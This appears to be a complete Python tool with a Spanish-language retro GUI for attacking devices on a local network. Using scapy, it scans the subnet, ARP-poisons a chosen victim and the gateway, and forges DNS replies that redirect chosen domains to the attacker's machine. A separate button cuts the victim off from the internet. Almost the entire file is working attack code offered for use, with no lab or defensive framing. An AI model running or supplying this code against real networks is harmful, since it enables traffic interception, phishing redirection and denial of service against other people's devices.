import tkinter as tk
from tkinter import ttk, scrolledtext
from scapy.all import *
import threading
import time

# === GLOBALS ===
victim_ip = ""
domains_to_spoof = []
spoofing = False
dns_spoofing = False
log_lock = threading.Lock()
gateway_ip = conf.route.route("0.0.0.0")[2]

# === FONT CONFIG ===
RETRO_FONT = ("Courier New", 10)  # Cambia a ("Press Start 2P", 8) si la tienes instalada

# === LOG FUNCTION ===
def log(message):
    with log_lock:
        log_box.insert(tk.END, f"[{time.strftime('%H:%M:%S')}] {message}\n")
        log_box.see(tk.END)

# === NETWORK FUNCTIONS ===
def get_mac(ip):
    ans, _ = sr(ARP(pdst=ip), timeout=2, verbose=0)
    for s, r in ans:
        return r[ARP].hwsrc
    return None

def arp_spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if not target_mac:
        log(f"[!] No se pudo obtener la MAC de {target_ip}")
        return

    pkt = Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    sendp(pkt, verbose=0, iface=conf.iface)

def restore_arp(target_ip, source_ip):
    target_mac = get_mac(target_ip)
    source_mac = get_mac(source_ip)
    pkt = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
    send(pkt, count=5, verbose=0)

def start_arp_spoof():
    global spoofing, dns_spoofing
    spoofing = True
    dns_spoofing = True
    log("[*] Iniciando ARP Spoofing + DNS Spoofing...")

    victim = victim_ip_entry.get().strip()
    if not victim:
        log("[!] No se ha especificado la IP de la víctima.")
        return

    domains = [d.strip().lower() for d in domains_entry.get().split(",") if d.strip()]
    if not domains:
        log("[!] No se han especificado dominios a spoofear.")
        return

    def spoof_loop():
        while spoofing:
            arp_spoof(victim, gateway_ip)
            arp_spoof(gateway_ip, victim)
            time.sleep(2)

    threading.Thread(target=spoof_loop, daemon=True).start()

    attacker_ip = get_if_addr(conf.iface)

    def process_dns(pkt):
        if pkt.haslayer(DNSQR) and pkt.haslayer(IP) and pkt.haslayer(UDP):
            queried_domain = pkt[DNSQR].qname.decode().strip('.').lower()
            source_ip = pkt[IP].src

            if source_ip == victim and any(domain in queried_domain for domain in domains):
                victim_mac = get_mac(source_ip)
                if not victim_mac:
                    log(f"[!] No se pudo obtener la MAC de la víctima ({source_ip}) para DNS spoof.")
                    return

                log(f"[+] Spoofing DNS para {queried_domain} → {attacker_ip}")

                spoofed_response = Ether(dst=victim_mac)/IP(dst=source_ip, src=pkt[IP].dst)/ \
                    UDP(dport=pkt[UDP].sport, sport=53)/ \
                    DNS(
                        id=pkt[DNS].id,
                        qr=1,
                        aa=1,
                        qd=pkt[DNS].qd,
                        an=DNSRR(rrname=pkt[DNSQR].qname, ttl=300, rdata=attacker_ip)
                    )

                sendp(spoofed_response, iface=conf.iface, verbose=0)

    def dns_sniffer():
        sniff(filter=f"udp port 53 and src host {victim}", prn=process_dns, store=0)

    threading.Thread(target=dns_sniffer, daemon=True).start()
    status_var.set("Spoofing activo █")

def stop_spoofing():
    global spoofing, dns_spoofing
    spoofing = False
    dns_spoofing = False
    restore_arp(victim_ip_entry.get(), gateway_ip)
    restore_arp(gateway_ip, victim_ip_entry.get())
    log("[*] Ataques detenidos y ARP restaurado.")
    status_var.set("Inactivo █")

def scan_network():
    log("[*] Escaneando red con ARP Broadcast...")
    hosts_tree.delete(*hosts_tree.get_children())
    attacker_ip = get_if_addr(conf.iface)
    subnet = gateway_ip + "/24"
    try:
        answered, _ = arping(subnet, timeout=2, verbose=0)
        for sent, received in answered:
            ip = received.psrc
            mac = received.hwsrc
            ip_display = f"{ip} (HOST)" if ip == attacker_ip else ip
            hosts_tree.insert('', 'end', values=(ip_display, mac))
            log(f"[+] Host detectado: {ip_display} - {mac}")
        log("[*] Escaneo completado.")
    except Exception as e:
        log(f"[!] Error en escaneo: {e}")

def handle_host_selection(event):
    selected = hosts_tree.selection()
    if selected:
        item = hosts_tree.item(selected[0])
        ip = item['values'][0]
        victim_ip_entry.delete(0, tk.END)
        victim_ip_entry.insert(0, ip.split()[0])

def leave_without_internet():
    global spoofing
    spoofing = True
    log("[*] Envenenando ARP para dejar sin Internet a la víctima...")

    victim_ip = victim_ip_entry.get().strip()
    if not victim_ip:
        log("[!] No se ha seleccionado IP de víctima.")
        return

    gateway = conf.route.route("0.0.0.0")[2]
    attacker_mac = get_if_hwaddr(conf.iface)

    victim_mac = None
    for child in hosts_tree.get_children():
        ip_value = hosts_tree.item(child, 'values')[0]
        mac_value = hosts_tree.item(child, 'values')[1]
        if victim_ip in ip_value:
            victim_mac = mac_value
            break

    if not victim_mac:
        log("[!] No se encontró la MAC asociada a la IP víctima.")
        return

    def attack_loop():
        while spoofing:
            pkt = Ether(dst=victim_mac) / ARP(op=2, psrc=gateway, pdst=victim_ip, hwdst=victim_mac, hwsrc=attacker_mac)
            sendp(pkt, verbose=0, iface=conf.iface)
            log(f"[+] ARP enviado: {gateway} → {attacker_mac} (para {victim_ip})")
            time.sleep(2)

    threading.Thread(target=attack_loop, daemon=True).start()
    status_var.set("Internet bloqueado █")

# === GUI SETUP ===
app = tk.Tk()
app.title("💀 ARP/DNS Spoof Tool 198X")
app.configure(bg="black")
app.geometry("1024x640")

# === STYLE ===
style = ttk.Style()
style.theme_use("clam")
style.configure("Treeview", background="black", foreground="lime", fieldbackground="black", font=RETRO_FONT)
style.configure("Treeview.Heading", background="black", foreground="white", font=RETRO_FONT)

# === HEADLINE (Animated) ===
headline_label = tk.Label(app, text="", font=("Courier New", 14), fg="lime", bg="black")
headline_label.pack(pady=10)

full_text = ">> ARP/DNS SPOOF TERMINAL ACTIVE <<"
def animate_text(i=0):
    if i <= len(full_text):
        headline_label.config(text=full_text[:i])
        app.after(50, animate_text, i+1)
animate_text()

# === INPUTS ===
frame_top = tk.LabelFrame(app, text="CONFIGURACIÓN", fg="cyan", bg="black", font=RETRO_FONT)
frame_top.pack(padx=10, pady=10, fill="x")

tk.Label(frame_top, text="IP Víctima:", fg="lime", bg="black", font=RETRO_FONT).grid(row=0, column=0)
victim_ip_entry = tk.Entry(frame_top, width=20, bg="black", fg="lime", insertbackground='lime', font=RETRO_FONT)
victim_ip_entry.grid(row=0, column=1, padx=5)

tk.Label(frame_top, text="Dominios (coma separados):", fg="lime", bg="black", font=RETRO_FONT).grid(row=0, column=2)
domains_entry = tk.Entry(frame_top, width=40, bg="black", fg="lime", insertbackground='lime', font=RETRO_FONT)
domains_entry.grid(row=0, column=3, padx=5)

# === BUTTONS ===
frame_buttons = tk.Frame(app, bg="black")
frame_buttons.pack(pady=10)

def make_button(text, cmd, color):
    return tk.Button(frame_buttons, text=text, command=cmd, bg="black", fg=color,
                     activebackground=color, activeforeground="black", font=RETRO_FONT,
                     highlightbackground=color, highlightthickness=1, bd=0, padx=10, pady=5)

make_button("▶ Iniciar", start_arp_spoof, "green").pack(side=tk.LEFT, padx=10)
make_button("🛑 Detener", stop_spoofing, "red").pack(side=tk.LEFT, padx=10)
make_button("🌐 Escanear Red", lambda: threading.Thread(target=scan_network, daemon=True).start(), "cyan").pack(side=tk.LEFT, padx=10)
make_button("⛔ Dejar sin Internet", leave_without_internet, "magenta").pack(side=tk.LEFT, padx=10)

# === TABLE ===
hosts_tree = ttk.Treeview(app, columns=("IP", "MAC"), show="headings", height=10)
hosts_tree.heading("IP", text="Dirección IP")
hosts_tree.heading("MAC", text="Dirección MAC")
hosts_tree.bind("<Double-1>", handle_host_selection)
hosts_tree.pack(pady=10)

# === LOG ===
log_box = scrolledtext.ScrolledText(app, bg="black", fg="lime", font=RETRO_FONT, height=10, insertbackground="lime")
log_box.pack(fill="both", padx=10, pady=10, expand=True)

# === STATUS BAR ===
status_var = tk.StringVar(value="Inactivo █")
status_bar = tk.Label(app, textvariable=status_var, fg="magenta", bg="black", font=RETRO_FONT, anchor='w')
status_bar.pack(fill="x")

# === MAIN LOOP ===
app.mainloop()
